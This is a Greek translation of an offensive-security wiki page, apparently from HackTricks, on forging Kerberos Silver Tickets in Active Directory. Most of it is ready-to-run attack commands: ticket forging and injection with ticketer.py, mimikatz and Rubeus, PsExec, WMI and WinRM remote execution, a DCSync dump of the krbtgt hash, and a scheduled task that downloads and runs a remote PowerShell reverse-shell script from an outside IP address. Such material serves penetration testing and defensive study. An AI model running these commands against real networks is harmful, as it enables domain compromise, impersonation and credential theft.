# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Η επίθεση **Silver Ticket** περιλαμβάνει την εκμετάλλευση των εισιτηρίων υπηρεσιών σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην **απόκτηση του NTLM hash ενός λογαριασμού υπηρεσίας**, όπως ένας λογαριασμός υπολογιστή, για να κατασκευαστεί ένα εισιτήριο Ticket Granting Service (TGS). Με αυτό το πλαστό εισιτήριο, ένας επιτιθέμενος μπορεί να έχει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, **υποδυόμενος οποιονδήποτε χρήστη**, συνήθως στοχεύοντας σε διοικητικά δικαιώματα. Τονίζεται ότι η χρήση κλειδιών AES για την κατασκευή εισιτηρίων είναι πιο ασφαλής και λιγότερο ανιχνεύσιμη.

Για την κατασκευή εισιτηρίων, χρησιμοποιούνται διάφορα εργαλεία ανάλογα με το λειτουργικό σύστημα:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Στα Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS επισημαίνεται ως κοινός στόχος για την πρόσβαση στο σύστημα αρχείων του θύματος, αλλά και άλλες υπηρεσίες όπως οι HOST και RPCSS μπορούν επίσης να εκμεταλλευτούν για εργασίες και ερωτήματα WMI.

## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                            | Υπηρεσία Silver Tickets                                                   |
| ------------------------------------------ | ------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το OS επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε απλώς να ζητήσετε: WINRM</p> |
| Προγραμματισμένα Καθήκοντα                | HOST                                                                     |
| Κοινή Χρήση Αρχείων Windows, επίσης psexec | CIFS                                                                     |
| Λειτουργίες LDAP, συμπεριλαμβανομένου του DCSync | LDAP                                                                     |
| Εργαλεία Διαχείρισης Απομακρυσμένου Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
| Χρυσά Εισιτήρια                            | krbtgt                                                                   |

Χρησιμοποιώντας **Rubeus** μπορείτε να **ζητήσετε όλα** αυτά τα εισιτήρια χρησιμοποιώντας την παράμετρο:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs Εισιτηρίων Silver

- 4624: Σύνδεση Λογαριασμού
- 4634: Αποσύνδεση Λογαριασμού
- 4672: Σύνδεση Διαχειριστή

## Κατάχρηση Εισιτηρίων Υπηρεσίας

Στα παρακάτω παραδείγματα ας φανταστούμε ότι το εισιτήριο ανακτάται υποδυόμενοι τον λογαριασμό διαχειριστή.

### CIFS

Με αυτό το εισιτήριο θα μπορείτε να έχετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (αν είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε ένα μέρος του απομακρυσμένου συστήματος αρχείων απλά κάνοντας κάτι όπως:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στον υπολογιστή ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Με αυτή την άδεια μπορείτε να δημιουργήσετε προγραμματισμένα καθήκοντα σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα εισιτήρια μπορείτε να **εκτελέσετε WMI στο σύστημα του θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες σχετικά με το wmiexec** στη σελίδα που ακολουθεί:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε να **έχετε πρόσβαση σε αυτόν** και ακόμη και να αποκτήσετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Δείτε την παρακάτω σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο υπολογιστή χρησιμοποιώντας winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι **το winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να έχετε πρόσβαση σε αυτόν.

### LDAP

Με αυτό το προνόμιο μπορείτε να εξάγετε τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα για το DCSync** στην παρακάτω σελίδα:

## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
